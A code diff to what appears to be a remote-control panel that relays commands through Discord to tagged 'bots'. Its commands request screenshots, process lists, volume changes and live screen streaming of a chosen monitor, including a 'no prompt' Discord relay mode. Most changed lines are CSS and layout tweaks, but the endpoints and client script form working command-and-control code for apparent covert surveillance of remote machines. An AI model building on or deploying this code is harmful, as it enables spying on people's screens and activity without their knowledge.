@@ -224,7 +224,7 @@ hub = Hub()
 @bot.event
 async def on_message(message: discord.Message):
     await bot.process_commands(message)
-    if message.author.bot and message.channel.id == TARGET_CHANNEL_ID:
+    if message.author.bot and message.channel.id in {TARGET_CHANNEL_ID, TAG_BROADCAST_CHANNEL_ID}:
         tag = _extract_tag(message.content or "")
         print(f"[MSG] from {message.author} content={message.content!r} tag_detected={tag}")
         new_tag = False
@@ -305,8 +305,8 @@ PANEL_HTML = r"""<!doctype html>
     }
     *{box-sizing:border-box;} body{margin:0; font:15px/1.55 "Inter","Segoe UI",Arial,sans-serif; background:radial-gradient(80% 60% at 10% 0%, rgba(93,175,255,.16), transparent), radial-gradient(65% 55% at 85% 0%, rgba(95,224,197,.12), transparent), var(--bg); color:var(--text);}
     a{color:inherit;}
-    .page{max-width:1200px; margin:0 auto; padding:24px 16px 42px;}
-    header.hero{display:flex; align-items:center; justify-content:space-between; gap:12px; flex-wrap:wrap; padding:16px 18px; border:1px solid var(--line); border-radius:14px; background:rgba(16,21,33,.85); backdrop-filter:blur(6px);}
+    .page{max-width:1200px; margin:0 auto; padding:20px 12px 42px;}
+    header.hero{display:flex; align-items:center; justify-content:space-between; gap:12px; flex-wrap:wrap; padding:14px 16px; border:1px solid var(--line); border-radius:14px; background:rgba(16,21,33,.85); backdrop-filter:blur(6px);}
     h1{margin:4px 0 0; font-size:24px;} .eyebrow{letter-spacing:0.28px; text-transform:uppercase; font-size:12px; color:var(--muted);}
     .status{display:flex; gap:8px; flex-wrap:wrap; align-items:center;} .pill{display:inline-flex; align-items:center; gap:8px; padding:7px 11px; border:1px solid var(--line); border-radius:10px; background:var(--card); font-weight:700;} .dot{width:10px; height:10px; border-radius:50%; background:#f5c04a;} .dot.ok{background:#5fe0c5;} .dot.bad{background:var(--danger);}
     .tag-control{display:grid; gap:6px; padding:8px 10px; border:1px solid var(--line); border-radius:10px; background:var(--card); min-width:240px;}
@@ -316,23 +316,31 @@ PANEL_HTML = r"""<!doctype html>
     .tag-list{display:flex; flex-wrap:wrap; gap:6px; max-width:320px;}
     .tag-chip{border:1px solid var(--line); padding:5px 8px; border-radius:8px; background:#0c1220; cursor:pointer; font-weight:700;} .tag-chip:hover{border-color:var(--accent); color:var(--accent);}
     .shell{margin-top:16px; border:1px solid var(--line); border-radius:16px; background:var(--panel); box-shadow:0 20px 50px rgba(0,0,0,.35); overflow:hidden;}
-    .tabbar{display:flex; gap:8px; padding:12px; border-bottom:1px solid var(--line); background:rgba(17,25,42,.75);}
-    .tab-btn{flex:1; border:1px solid var(--line); background:var(--card); color:var(--text); padding:10px 12px; border-radius:10px; cursor:pointer; font-weight:700; letter-spacing:0.2px; transition:all .18s ease;} 
+    .tabbar{display:flex; gap:8px; padding:12px; border-bottom:1px solid var(--line); background:rgba(17,25,42,.75); overflow-x:auto;}
+    .tab-btn{flex:1; min-width:120px; border:1px solid var(--line); background:var(--card); color:var(--text); padding:10px 12px; border-radius:10px; cursor:pointer; font-weight:700; letter-spacing:0.2px; transition:all .18s ease;} 
     .tab-btn.active{background:linear-gradient(120deg,var(--accent),var(--accent2)); color:#061021; border-color:transparent; transform:translateY(-1px); box-shadow:0 12px 30px rgba(79,136,255,.35);}
     .panel{padding:18px 18px 20px; min-height:480px; position:relative;}
     .view{position:absolute; inset:0; padding:18px; opacity:0; transform:translateY(10px); transition:opacity .22s ease, transform .22s ease; pointer-events:none;}
     .view.active{opacity:1; transform:translateY(0); pointer-events:auto;}
-    .grid{display:grid; grid-template-columns:1.05fr .95fr; gap:14px;} @media(max-width:960px){.grid{grid-template-columns:1fr;}}
+    .grid{display:grid; grid-template-columns:1.05fr .95fr; gap:14px;} @media(max-width:960px){.grid{grid-template-columns:1fr;}} @media(max-width:720px){.grid{grid-template-columns:1fr; gap:10px;}}
     .card{border:1px solid var(--line); border-radius:12px; background:var(--card); padding:14px;}
     .head{display:flex; justify-content:space-between; gap:10px; align-items:center; flex-wrap:wrap; margin-bottom:10px;} h3{margin:0;}
     .btn{border:1px solid var(--line); background:var(--card); color:var(--text); padding:9px 12px; border-radius:10px; font-weight:700; cursor:pointer; transition:transform .08s ease, filter .15s ease;} .btn:hover{filter:brightness(1.06); transform:translateY(-1px);} .btn.primary{background:linear-gradient(120deg,var(--accent),var(--accent2)); color:#061021; border:none;} .btn.danger{background:var(--danger); border-color:var(--danger); color:#061021;} .btn.small{padding:7px 10px; font-size:13px;}
-    .stack{display:grid; gap:10px;} .row{display:flex; gap:8px; flex-wrap:wrap;} input{flex:1; min-width:220px; padding:10px 12px; border-radius:10px; border:1px solid var(--line); background:#0a0f1a; color:var(--text);} label{font-weight:700;}
+    .stack{display:grid; gap:10px;} .row{display:flex; gap:8px; flex-wrap:wrap;} input{flex:1; min-width:180px; padding:10px 12px; border-radius:10px; border:1px solid var(--line); background:#0a0f1a; color:#e7edf8;} label{font-weight:700;}
     .feed{display:flex; flex-direction:column; gap:10px; max-height:420px; overflow:auto; padding-right:4px;} .feed.small{max-height:360px;} .item{border:1px solid var(--line); border-radius:10px; padding:10px 12px; background:rgba(14,19,30,.9);} .meta{font-size:12px; color:var(--muted); margin-bottom:6px; word-break:break-word;}
     .gallery{display:grid; grid-template-columns: repeat(auto-fit, minmax(200px,1fr)); gap:10px;} .shot{border:1px solid var(--line); border-radius:12px; overflow:hidden; background:#0b0f19; cursor:pointer;} .shot img{width:100%; display:block;}
-    .live-frame{border:1px solid var(--line); border-radius:12px; background:radial-gradient(60% 60% at 30% 30%, rgba(95,224,197,.1), transparent), radial-gradient(50% 60% at 70% 40%, rgba(77,130,255,.12), transparent), #0c1220; min-height:280px; display:flex; align-items:center; justify-content:center; position:relative; overflow:hidden;}
+    .live-frame{border:1px solid var(--line); border-radius:12px; background:radial-gradient(60% 60% at 30% 30%, rgba(95,224,197,.1), transparent), radial-gradient(50% 60% at 70% 40%, rgba(77,130,255,.12), transparent), #0c1220; min-height:220px; display:flex; align-items:center; justify-content:center; position:relative; overflow:hidden;}
     .live-frame img{max-width:100%; width:100%; height:auto; object-fit:contain; display:none;}
     .live-frame.active img{display:block;}
     .live-frame .muted{position:absolute; inset:auto; margin:auto;}
+    .live-controls{gap:6px; flex-wrap:wrap;} .input-compact{max-width:90px;}
+    @media(max-width:640px){
+      body{font-size:14px;}
+      .tab-btn{flex:1 0 auto;}
+      .card{padding:12px;}
+      .head{flex-direction:column; align-items:flex-start;}
+      .live-frame{min-height:200px;}
+    }
     #toast{position:fixed; left:50%; bottom:18px; transform:translateX(-50%); padding:9px 14px; border-radius:12px; border:1px solid var(--line); background:var(--panel); font-weight:700; opacity:0; transition:opacity .18s ease; z-index:120;}
   </style>
 </head>
@@ -424,12 +432,8 @@ PANEL_HTML = r"""<!doctype html>
           <div class="card" style="height:100%; display:flex; flex-direction:column; gap:14px;">
             <div class="head">
               <div><div class="eyebrow">Live</div><h3>Screen share</h3></div>
-              <div id="liveControls" class="row" style="gap:8px">
-                <input id="liveMonitor" style="max-width:80px" placeholder="1" value="1"/>
-                <select id="liveMode" class="btn" style="min-width:160px;">
-                  <option value="discord">Discord relay (no prompt)</option>
-                  <option value="http">HTTP MJPEG (faster)</option>
-                </select>
+              <div id="liveControls" class="row live-controls">
+                <input id="liveMonitor" class="input-compact" placeholder="1" value="1" title="Monitor index"/>
                 <button class="btn primary" onclick="startLiveStream()">Start</button>
                 <button class="btn" onclick="stopLiveStream()">Stop</button>
               </div>
@@ -484,7 +488,7 @@ PANEL_HTML = r"""<!doctype html>
   <div id="toast"></div>
 
   <script>
-    const el = {dot:document.getElementById('dot'), stxt:document.getElementById('stxt'), timeline:document.getElementById('timeline'), gallery:document.getElementById('gallery'), procFeed:document.getElementById('procFeed'), logFeed:document.getElementById('logFeed'), uptime:document.getElementById('uptime'), tagActive:document.getElementById('tagActive'), tagInput:document.getElementById('tagInput'), tagList:document.getElementById('tagList'), liveStatus:document.getElementById('liveStatus'), liveDot:document.getElementById('liveDot'), liveFrame:document.getElementById('liveFrame'), liveGate:document.getElementById('liveGate'), liveBody:document.getElementById('liveBody'), liveHint:document.getElementById('liveHint'), liveControls:document.getElementById('liveControls'), liveMode:document.getElementById('liveMode'), liveMonitor:document.getElementById('liveMonitor')};
+    const el = {dot:document.getElementById('dot'), stxt:document.getElementById('stxt'), timeline:document.getElementById('timeline'), gallery:document.getElementById('gallery'), procFeed:document.getElementById('procFeed'), logFeed:document.getElementById('logFeed'), uptime:document.getElementById('uptime'), tagActive:document.getElementById('tagActive'), tagInput:document.getElementById('tagInput'), tagList:document.getElementById('tagList'), liveStatus:document.getElementById('liveStatus'), liveDot:document.getElementById('liveDot'), liveFrame:document.getElementById('liveFrame'), liveGate:document.getElementById('liveGate'), liveBody:document.getElementById('liveBody'), liveHint:document.getElementById('liveHint'), liveControls:document.getElementById('liveControls'), liveMonitor:document.getElementById('liveMonitor')};
     const defaultTag = "{BOT_TAG}";
     let currentTag = defaultTag;
     let knownTags = new Set([currentTag]);
@@ -550,13 +554,12 @@ PANEL_HTML = r"""<!doctype html>
     document.querySelectorAll('.tab-btn').forEach(btn=> btn.onclick = ()=> setTab(btn.dataset.tab));
 
     function setLiveStatus(text, state='idle'){ liveActive = state==='ok'; if(el.liveStatus) el.liveStatus.textContent=text; if(el.liveDot){ el.liveDot.className='dot'+(state==='ok'?' ok': state==='error'?' bad':''); } if(state!=='ok' && el.liveFrame){ el.liveFrame.removeAttribute('src'); if(el.liveFrame.parentElement) el.liveFrame.parentElement.classList.remove('active'); if(el.liveHint) el.liveHint.style.display='block'; } }
-    function handleLiveFrame(obj){ if(!(obj.attachments&&obj.attachments.length)) return; const url=obj.attachments[0].url+(obj.attachments[0].url.includes('?')?'&':'?')+'t='+(Date.now()); if(el.liveFrame){ el.liveFrame.src=url; if(el.liveFrame.parentElement) el.liveFrame.parentElement.classList.add('active'); if(el.liveHint) el.liveHint.style.display='none'; } setLiveStatus('Receiving frames', 'ok'); }
-    function setLiveHttp(url){ if(!url) return; const bust=url + (url.includes('?')?'&':'?')+'t='+(Date.now()); if(el.liveFrame){ el.liveFrame.src=bust; if(el.liveFrame.parentElement) el.liveFrame.parentElement.classList.add('active'); el.liveFrame.style.display='block'; if(el.liveHint) el.liveHint.style.display='none'; el.liveFrame.onload=()=> el.liveFrame.parentElement?.classList.add('active'); el.liveFrame.onerror=()=> setLiveStatus('Stream error', 'error'); } setLiveStatus('Streaming over HTTP', 'ok'); }
-    function connectWS(){ setStatus(false); const ws = new WebSocket((location.protocol==='https:'?'wss://':'ws://') + location.host + '/ws'); ws.onopen = ()=> setStatus(true); ws.onclose = ()=> { setStatus(false); setTimeout(connectWS, 1200); }; ws.onmessage = ev => { const obj = JSON.parse(ev.data); if(obj.type !== 'text') return; const content=(obj.content||'').toUpperCase(); touchTagFromMessage(obj); const isLiveFrame=obj.is_live_frame===true || content.includes('LIVE_STREAM_FRAME'); const isLiveStopped=content.includes('LIVE_STREAM_STOPPED') || content.includes('LIVE_STREAM_HTTP_STOPPED'); const isLiveError=content.includes('LIVE_STREAM_ERROR') || content.includes('HTTP LIVE STREAM FAILED'); const liveHttpUrl=obj.live_http_url || (content.includes('LIVE_STREAM_HTTP') ? (obj.content||'').split(/\s+/).slice(2).join(' ') : null); if(liveHttpUrl){ setLiveHttp(liveHttpUrl); return; } if(isLiveFrame){ handleLiveFrame(obj); return; } if(isLiveStopped){ setLiveStatus('Stopped', 'idle'); } if(isLiveError){ setLiveStatus('Stream error', 'error'); } const msg = node(obj.author, obj.content, obj.ts); addFeed(el.timeline, msg.cloneNode(true)); addLog(msg.cloneNode(true)); if(obj.content && obj.content.toLowerCase().includes('filtered running processes')) addFeed(el.procFeed, msg.cloneNode(true)); if(obj.attachments && obj.attachments.length){ obj.attachments.forEach(a=> addShot(a.url)); } }; }
+    function handleLiveFrame(obj){ if(!(obj.attachments&&obj.attachments.length)) return; const url=obj.attachments[0].url+(obj.attachments[0].url.includes('?')?'&':'?')+'t='+(Date.now()); if(el.liveFrame){ el.liveFrame.src=url; if(el.liveFrame.parentElement) el.liveFrame.parentElement.classList.add('active'); el.liveFrame.style.display='block'; if(el.liveHint) el.liveHint.style.display='none'; el.liveFrame.onload=()=> el.liveFrame.parentElement?.classList.add('active'); el.liveFrame.onerror=()=> setLiveStatus('Stream error', 'error'); } setLiveStatus('Receiving frames', 'ok'); }
+    function connectWS(){ setStatus(false); const ws = new WebSocket((location.protocol==='https:'?'wss://':'ws://') + location.host + '/ws'); ws.onopen = ()=> setStatus(true); ws.onclose = ()=> { setStatus(false); setTimeout(connectWS, 1200); }; ws.onmessage = ev => { const obj = JSON.parse(ev.data); if(obj.type !== 'text') return; const content=(obj.content||'').toUpperCase(); touchTagFromMessage(obj); const isLiveFrame=obj.is_live_frame===true || content.includes('LIVE_STREAM_FRAME'); const isLiveStopped=content.includes('LIVE_STREAM_STOPPED'); const isLiveError=content.includes('LIVE_STREAM_ERROR'); if(isLiveFrame){ handleLiveFrame(obj); return; } if(isLiveStopped){ setLiveStatus('Stopped', 'idle'); } if(isLiveError){ setLiveStatus('Stream error', 'error'); } const msg = node(obj.author, obj.content, obj.ts); addFeed(el.timeline, msg.cloneNode(true)); addLog(msg.cloneNode(true)); if(obj.content && obj.content.toLowerCase().includes('filtered running processes')) addFeed(el.procFeed, msg.cloneNode(true)); if(obj.attachments && obj.attachments.length){ obj.attachments.forEach(a=> addShot(a.url)); } }; }
     connectWS(); refreshTags(); renderTags();
 
     async function post(path){ const r = await fetch(withTag(path),{method:'POST'}); const data = await r.json().catch(()=>({})); if(!r.ok) throw new Error(data.error||'Request failed'); return data; }
-    async function startLiveStream(){ if(!hasSelectedTag){ toast('Select a bot first'); setTab('live'); updateLiveGate(); return; } const mode=(el.liveMode?.value||'discord'); const monitor=(el.liveMonitor?.value||'1'); setLiveStatus('Requesting stream...', 'pending'); try{ await post('/cmd/live/start?mode='+encodeURIComponent(mode)+'&monitor='+encodeURIComponent(monitor)); toast('Live request sent ('+mode+')'); setLiveStatus(mode==='http'?'Waiting for stream URL...':'Waiting for frames...', 'pending'); } catch(e){ setLiveStatus('Start failed', 'error'); toast(e.message);} }
+    async function startLiveStream(){ if(!hasSelectedTag){ toast('Select a bot first'); setTab('live'); updateLiveGate(); return; } const monitor=(el.liveMonitor?.value||'1'); setLiveStatus('Requesting stream...', 'pending'); try{ await post('/cmd/live/start?monitor='+encodeURIComponent(monitor)); toast('Live request sent (Discord relay)'); setLiveStatus('Waiting for frames...', 'pending'); } catch(e){ setLiveStatus('Start failed', 'error'); toast(e.message);} }
     async function stopLiveStream(){ if(!hasSelectedTag){ toast('Select a bot first'); return; } try{ await post('/cmd/live/stop'); toast('Stop request sent'); setLiveStatus('Stopping...', 'pending'); } catch(e){ toast(e.message);} }
     async function doShot(){ try{ await post('/cmd/ss'); toast('Screenshot requested'); } catch(e){ toast(e.message);} }
     async function doProcs(){ try{ await post('/cmd/ps'); toast('Process list requested'); } catch(e){ toast(e.message);} }
@@ -672,13 +675,8 @@ async def cmd_set_volume(pct: float = Query(100.0), tag: str = Query(None)):
 @app.post("/cmd/live/start")
 async def cmd_live_start(
     monitor: int = Query(1, ge=1),
-    mode: str = Query("discord"),
     tag: str = Query(None),
 ):
-    mode_clean = (mode or "discord").lower()
-    if mode_clean == "http":
-        await _send_cmd(f"{_resolve_tag(tag)} LIVE_STREAM_HTTP_START {monitor}")
-        return JSONResponse({"ok": True, "monitor": monitor, "mode": "http"})
     await _send_cmd(f"{_resolve_tag(tag)} LIVE_STREAM_START {monitor}")
     return JSONResponse({"ok": True, "monitor": monitor, "mode": "discord"})
 
